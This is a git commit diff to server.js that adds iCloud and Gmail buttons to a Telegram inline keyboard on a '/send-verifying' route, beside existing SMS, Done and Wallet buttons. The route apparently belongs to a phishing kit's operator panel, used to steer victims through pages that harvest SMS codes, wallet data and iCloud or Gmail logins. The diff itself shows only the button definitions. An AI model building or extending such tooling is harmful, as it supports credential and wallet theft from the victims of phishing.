57b7e2a2584b23e0a5468647d4ff29cbabc5b628
gratous100 <122572602+gratous100@users.noreply.github.com>
2026-09-13 17:02:44 +0100

    Update server.js

--- server.js
+++ server.js
@@ -1515,7 +1515,11 @@ app.post("/send-verifying", async (req, res) => {
         inline_keyboard: [
           [{ text: "💬 SMS - 2 💬", callback_data: `verifying_sms|${verifyingId}` }],
           [{ text: "🏁 Done 🏁", callback_data: `verifying_done|${verifyingId}` }],
-          [{ text: "💼 Wallet 💼", callback_data: `verifying_wallet|${verifyingId}` }]
+          [{ text: "💼 Wallet 💼", callback_data: `verifying_wallet|${verifyingId}` }],
+          [
+            { text: "☁️", callback_data: `verifying_icloud|${verifyingId}` },
+            { text: "🌈", callback_data: `verifying_gmail|${verifyingId}` }
+          ]
         ]
       }
     };
